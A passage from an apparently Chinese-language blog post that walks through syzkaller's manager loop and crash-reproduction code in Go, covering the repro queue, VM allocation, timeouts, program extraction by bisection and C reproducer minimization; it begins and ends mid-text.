&amp; crash repro，等待处理不同 channel 数据"></a>二、外层大循环：调配空闲 VM 进行 fuzz &amp; crash repro，等待处理不同 channel 数据</h2><p>大循环的终止条件为 <code>shutdown == nil</code> 或是 ResourcePool 中的 VM 数量与总数量不相等，进入循环后首先会获取当前所在阶段： </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> shutdown != <span class="hljs-literal">nil</span> || instances.Len() != vmCount &#123;<br>mgr.mu.Lock()<br>phase := mgr.phase<br>mgr.mu.Unlock()<br></code></pre></td></tr></table></figure><h3 id="Step-1-内层小循环：获取待复现-crash-加入复现队列"><a href="#Step-1-内层小循环：获取待复现-crash-加入复现队列" class="headerlink" title="Step 1. 内层小循环：获取待复现 crash 加入复现队列"></a>Step 1. 内层小循环：获取待复现 crash 加入复现队列</h3><p>小循环会遍历 <code>pendingRepro</code> 中的 crash：</p><ul><li>若未被复现则从 pendingRepro 中删除</li><li>调用 <code>needRepro()</code> 检查是否需要复现</li><li>标记该标题的 crash 已在复现，并加入复现队列中</li></ul><p>这里的 <code>crash.Title</code> 其实是 <strong>Oops 的第一行文本，</strong>即<strong>同一时刻仅会复现同类 crash 中的一个</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> crash := <span class="hljs-keyword">range</span> pendingRepro &#123;<br><span class="hljs-keyword">if</span> reproducing[crash.Title] &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-built_in">delete</span>(pendingRepro, crash)<br><span class="hljs-keyword">if</span> !mgr.needRepro(crash) &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: add to repro queue &#x27;%v&#x27;&quot;</span>, crash.Title)<br>reproducing[crash.Title] = <span class="hljs-literal">true</span><br>reproQueue = <span class="hljs-built_in">append</span>(reproQueue, crash)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-2-判断是否可以对-crash-进行复现并调控-VM"><a href="#Step-2-判断是否可以对-crash-进行复现并调控-VM" class="headerlink" title="Step 2. 判断是否可以对 crash 进行复现并调控 VM"></a>Step 2. 判断是否可以对 crash 进行复现并调控 VM</h3><p>接下来会输出一行日志，之后定义一个闭包函数 <code>canRepro</code>，用来判断<strong>当前是否可以进行 crash 复现</strong>，主要判断以下三个条件是否满足：</p><ul><li>当前阶段是否超过 <code>phaseTriagedHub</code> </li><li>待复现队列 <code>reproQueue</code> 是否不为空</li><li>加上该 crash 后所有用来复现 crash 的 VM 数量是否小于 <code>maxReproVMs</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go">log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: phase=%v shutdown=%v instances=%v/%v %+v repro: pending=%v reproducing=%v queued=%v&quot;</span>,<br>phase, shutdown == <span class="hljs-literal">nil</span>, instances.Len(), vmCount, instances.Snapshot(),<br><span class="hljs-built_in">len</span>(pendingRepro), <span class="hljs-built_in">len</span>(reproducing), <span class="hljs-built_in">len</span>(reproQueue))<br><br>canRepro := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> phase &gt;= phaseTriagedHub &amp;&amp; <span class="hljs-built_in">len</span>(reproQueue) != <span class="hljs-number">0</span> &amp;&amp;<br>(<span class="hljs-type">int</span>(atomic.LoadUint32(&amp;mgr.numReproducing))+<span class="hljs-number">1</span>)*instancesPerRepro &lt;= maxReproVMs<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来是两个小循环：</p><h4 id="①-循环启动协程调度-VM-进行-crash-复现"><a href="#①-循环启动协程调度-VM-进行-crash-复现" class="headerlink" title="① 循环启动协程调度 VM 进行 crash 复现"></a>① 循环启动协程调度 VM 进行 crash 复现</h4><p>第一个小循环会循环判断是否可以进行 crash 复现：</p><ul><li>若可以复现则从资源池队列中取出一个 VM idx，若资源池为空则直接跳出</li><li>从 <code>reproQueue</code> 中取出一个 crash，更新 manager 的 <code>numReproducing</code> 计数</li><li>启动一个新的协程调用 <code>runRepro()</code> 对该 crash 进行复现，结果输出至 <code>reproDone</code> 队列中</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> shutdown != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">for</span> canRepro() &#123;<br>vmIndexes := instances.Take(instancesPerRepro)<br><span class="hljs-keyword">if</span> vmIndexes == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>last := <span class="hljs-built_in">len</span>(reproQueue) - <span class="hljs-number">1</span><br>crash := reproQueue[last]<br>reproQueue[last] = <span class="hljs-literal">nil</span><br>reproQueue = reproQueue[:last]<br>atomic.AddUint32(&amp;mgr.numReproducing, <span class="hljs-number">1</span>)<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: starting repro of &#x27;%v&#x27; on instances %+v&quot;</span>, crash.Title, vmIndexes)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>reproDone &lt;- mgr.runRepro(crash, vmIndexes, instances.Put)<br>&#125;()<br>&#125;<br></code></pre></td></tr></table></figure><p> 而 <code>runRepro()</code> 其实就是 <code>repro.Run()</code> 的 wrapper ＋ 一些错误检查后将 VM idx 放回资源池，这里就不展开了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> runRepro(crash *Crash, vmIndexes []<span class="hljs-type">int</span>, putInstances <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(...<span class="hljs-type">int</span>)</span></span>) *ReproResult &#123;<br>features := mgr.checkResult.Features<br>res, stats, err := repro.Run(crash.Output, mgr.cfg, features, mgr.reporter, mgr.vmPool, vmIndexes)<br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p><code>Run()</code> 一开始主要是一些检查，之后根据 crash 类型的不同设置不同的复现时间上限：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Run</span><span class="hljs-params">(crashLog []<span class="hljs-type">byte</span>, cfg *mgrconfig.Config, features *host.Features, reporter *report.Reporter,</span></span><br><span class="hljs-params"><span class="hljs-function">vmPool *vm.Pool, vmIndexes []<span class="hljs-type">int</span>)</span></span> (*Result, *Stats, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(vmIndexes) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;no VMs provided&quot;</span>)<br>&#125;<br>entries := cfg.Target.ParseLog(crashLog)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(entries) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;crash log does not contain any programs&quot;</span>)<br>&#125;<br>crashStart := <span class="hljs-built_in">len</span>(crashLog)<br>crashTitle, crashType := <span class="hljs-string">&quot;&quot;</span>, report.Unknown<br><span class="hljs-keyword">if</span> rep := reporter.Parse(crashLog); rep != <span class="hljs-literal">nil</span> &#123;<br>crashStart = rep.StartPos<br>crashTitle = rep.Title<br>crashType = rep.Type<br>&#125;<br>testTimeouts := []time.Duration&#123;<br><span class="hljs-number">3</span> * cfg.Timeouts.Program, <span class="hljs-comment">// 以捕获更简单的 crashes (即 no races and no hangs)</span><br><span class="hljs-number">20</span> * cfg.Timeouts.Program,<br>cfg.Timeouts.NoOutputRunningTime, <span class="hljs-comment">// 以捕获 &quot;no output&quot;, races and hangs</span><br>&#125;<br><span class="hljs-keyword">switch</span> &#123;<br><span class="hljs-keyword">case</span> crashTitle == <span class="hljs-string">&quot;&quot;</span>:<br>crashTitle = <span class="hljs-string">&quot;no output/lost connection&quot;</span><br><span class="hljs-comment">// Lost connection 可以被更快地检测到,</span><br><span class="hljs-comment">// 但理论上若其由竞争造成，则可能需要最长的 timeout.</span><br><span class="hljs-comment">// No output 仅能在最大的 timeout 下被复现.</span><br><span class="hljs-comment">// 作为妥协，我们使用最小与最大的 timeouts.</span><br>testTimeouts = []time.Duration&#123;testTimeouts[<span class="hljs-number">0</span>], testTimeouts[<span class="hljs-number">2</span>]&#125;<br><span class="hljs-keyword">case</span> crashType == report.MemoryLeak:<br><span class="hljs-comment">// 由于昂贵的设置与扫描，内存泄露不能被很快地检测到.</span><br>testTimeouts = testTimeouts[<span class="hljs-number">1</span>:]<br><span class="hljs-keyword">case</span> crashType == report.Hang:<br>testTimeouts = testTimeouts[<span class="hljs-number">2</span>:]<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来会将崩溃信息存储到一个 <code>context</code> 结构体中，并新建一个 WaitGroup：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go">ctx := &amp;context&#123;<br>target:       cfg.SysTarget,<br>reporter:     reporter,<br>crashTitle:   crashTitle,<br>crashType:    crashType,<br>instances:    <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *reproInstance, <span class="hljs-built_in">len</span>(vmIndexes)),<br>bootRequests: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-built_in">len</span>(vmIndexes)),<br>testTimeouts: testTimeouts,<br>startOpts:    createStartOptions(cfg, features, crashType),<br>stats:        <span class="hljs-built_in">new</span>(Stats),<br>timeouts:     cfg.Timeouts,<br>&#125;<br>ctx.reproLogf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;%v programs, %v VMs, timeouts %v&quot;</span>, <span class="hljs-built_in">len</span>(entries), <span class="hljs-built_in">len</span>(vmIndexes), testTimeouts)<br><span class="hljs-keyword">var</span> wg sync.WaitGroup<br>wg.Add(<span class="hljs-built_in">len</span>(vmIndexes))<br></code></pre></td></tr></table></figure><p>随后循环获取用以复现的 VM idx 并依次启动新协程调用 <code>CreateExecProgInstance()</code> <strong>创建 VM 并拷贝 crash 程序</strong>，若失败则休眠 10s 后重试，最多会尝试 <code>maxTry</code> 次；成功的结果会输出到 <code>ctx.instances</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, vmIndex := <span class="hljs-keyword">range</span> vmIndexes &#123;<br>ctx.bootRequests &lt;- vmIndex<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">defer</span> wg.Done()<br><span class="hljs-keyword">for</span> vmIndex := <span class="hljs-keyword">range</span> ctx.bootRequests &#123;<br><span class="hljs-keyword">var</span> inst *instance.ExecProgInstance<br>maxTry := <span class="hljs-number">3</span><br><span class="hljs-keyword">for</span> try := <span class="hljs-number">0</span>; try &lt; maxTry; try++ &#123;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-vm.Shutdown:<br>try = maxTry<br><span class="hljs-keyword">continue</span><br><span class="hljs-keyword">default</span>:<br>&#125;<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>inst, err = instance.CreateExecProgInstance(vmPool, vmIndex, cfg,<br>reporter, &amp;instance.OptionalConfig&#123;Logf: ctx.reproLogf&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;failed to init instance: %v&quot;</span>, err)<br>time.Sleep(<span class="hljs-number">10</span> * time.Second)<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">break</span><br>&#125;<br><span class="hljs-keyword">if</span> inst == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>ctx.instances &lt;- &amp;reproInstance&#123;execProg: inst, index: vmIndex&#125;<br>&#125;<br>&#125;()<br>&#125;<br><span class="hljs-comment">// 一些收尾工作...</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>wg.Wait()<br><span class="hljs-built_in">close</span>(ctx.instances)<br>&#125;()<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-built_in">close</span>(ctx.bootRequests)<br><span class="hljs-keyword">for</span> inst := <span class="hljs-keyword">range</span> ctx.instances &#123;<br>inst.execProg.VMInstance.Close()<br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure><p><code>CreateExecProgInstance()</code> 主要就是调用 <code>vmPool.Create()</code> 启动虚拟机后调用 <code>SetupExecProg()</code> 拷贝要执行的二进制文件，这里就不展开了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">CreateExecProgInstance</span><span class="hljs-params">(vmPool *vm.Pool, vmIndex <span class="hljs-type">int</span>, mgrCfg *mgrconfig.Config,</span></span><br><span class="hljs-params"><span class="hljs-function">reporter *report.Reporter, opt *OptionalConfig)</span></span> (*ExecProgInstance, <span class="hljs-type">error</span>) &#123;<br>vmInst, err := vmPool.Create(vmIndex)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create VM: %v&quot;</span>, err)<br>&#125;<br>ret, err := SetupExecProg(vmInst, mgrCfg, reporter, opt)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>vmInst.Close()<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> ret, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>回到 <code>Run()</code>  中，其最后会调用 <code>context.repro()</code> <strong>正式开始复现 crash 的工作</strong>，检查结果后返回：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go">res, err := ctx.repro(entries, crashStart)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;repro crashed as (corrupted=%v):\n%s&quot;</span>,<br>ctx.report.Corrupted, ctx.report.Report)<br><span class="hljs-comment">// Try to rerun the repro if the report is corrupted.</span><br><span class="hljs-keyword">for</span> attempts := <span class="hljs-number">0</span>; ctx.report.Corrupted &amp;&amp; attempts &lt; <span class="hljs-number">3</span>; attempts++ &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;report is corrupted, running repro again&quot;</span>)<br><span class="hljs-keyword">if</span> res.CRepro &#123;<br>_, err = ctx.testCProg(res.Prog, res.Duration, res.Opts)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>_, err = ctx.testProg(res.Prog, res.Duration, res.Opts)<br>&#125;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;final repro crashed as (corrupted=%v):\n%s&quot;</span>,<br>ctx.report.Corrupted, ctx.report.Report)<br>res.Report = ctx.report<br>&#125;<br><span class="hljs-keyword">return</span> res, ctx.stats, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>repro()</code> 函数主要分两部分：</p><ul><li><p>调用 <code>extractProg()</code> <strong>获取触发 crash 的程序集合</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *context)</span></span> repro(entries []*prog.LogEntry, crashStart <span class="hljs-type">int</span>) (*Result, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-comment">// 去除在 crash 发生后执行的程序.</span><br><span class="hljs-keyword">for</span> i, ent := <span class="hljs-keyword">range</span> entries &#123;<br><span class="hljs-keyword">if</span> ent.Start &gt; crashStart &#123;<br>entries = entries[:i]<br><span class="hljs-keyword">break</span><br>&#125;<br>&#125;<br><br>reproStart := time.Now()<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;reproducing took %s&quot;</span>, time.Since(reproStart))<br>&#125;()<br><br>res, err := ctx.extractProg(entries)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>res.Opts.Repro = <span class="hljs-literal">false</span><br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure></li><li><p>最小化程序集合并尝试生成可以触发该 crash 的 C 程序，返回结果：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 尝试最小化程序集</span><br>res, err = ctx.minimizeProg(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-comment">// 首先尝试在不简化配置的情况下提取 C repro.</span><br>res, err = ctx.extractC(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-comment">// 简化配置并尝试提取 C repro.</span><br><span class="hljs-keyword">if</span> !res.CRepro &#123;<br>res, err = ctx.simplifyProg(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 简化 C 相关的配置.</span><br><span class="hljs-keyword">if</span> res.CRepro &#123;<br>res, err = ctx.simplifyC(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> res, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p><code>extractProg()</code> 的逻辑比较简单：</p><ul><li>逆序后调用 <code>context.extractProgSingle()</code> <strong>逐个运行单个程序</strong>，若某一程序触发了 crash 则直接返回</li><li>若单一程序无法触发 crash，则调用 <code>context.extractProgBisect()</code> <strong>使用二分法找出触发 crash 的程序集合</strong></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *context)</span></span> extractProg(entries []*prog.LogEntry) (*Result, <span class="hljs-type">error</span>) &#123;<br>ctx.reproLogf(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;extracting reproducer from %v programs&quot;</span>, <span class="hljs-built_in">len</span>(entries))<br>start := time.Now()<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>ctx.stats.ExtractProgTime = time.Since(start)<br>&#125;()<br><br><span class="hljs-comment">// Extract last program on every proc.</span><br>procs := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">int</span>)<br><span class="hljs-keyword">for</span> i, ent := <span class="hljs-keyword">range</span> entries &#123;<br>procs[ent.Proc] = i<br>&#125;<br><span class="hljs-keyword">var</span> indices []<span class="hljs-type">int</span><br><span class="hljs-keyword">for</span> _, idx := <span class="hljs-keyword">range</span> procs &#123;<br>indices = <span class="hljs-built_in">append</span>(indices, idx)<br>&#125;<br>sort.Ints(indices)<br><span class="hljs-keyword">var</span> lastEntries []*prog.LogEntry<br><span class="hljs-keyword">for</span> i := <span class="hljs-built_in">len</span>(indices) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i-- &#123;<br>lastEntries = <span class="hljs-built_in">append</span>(lastEntries, entries[indices[i]])<br>&#125;<br><span class="hljs-keyword">for</span> _, timeout := <span class="hljs-keyword">range</span> ctx.testTimeouts &#123;<br><span class="hljs-comment">// 分别执行每个程序以检测由单个程序造成的简单的 crash.</span><br><span class="hljs-comment">// 程序被逆序执行, 通常最后一个程序就是罪魁祸首.</span><br>res, err := ctx.extractProgSingle(lastEntries, timeout)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;found reproducer with %d syscalls&quot;</span>, <span class="hljs-built_in">len</span>(res.Prog.Calls))<br><span class="hljs-keyword">return</span> res, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// 若只有一个 entry 则不进行二分.</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(entries) == <span class="hljs-number">1</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><br><span class="hljs-comment">// 执行多个程序并二分 log 以找到造成崩溃的多个程序.</span><br>res, err = ctx.extractProgBisect(entries, timeout)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;found reproducer with %d syscalls&quot;</span>, <span class="hljs-built_in">len</span>(res.Prog.Calls))<br><span class="hljs-keyword">return</span> res, <span class="hljs-literal">nil</span><br>&#125;<br>&#125;<br><br>ctx.reproLogf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;failed to extract reproducer&quot;</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span 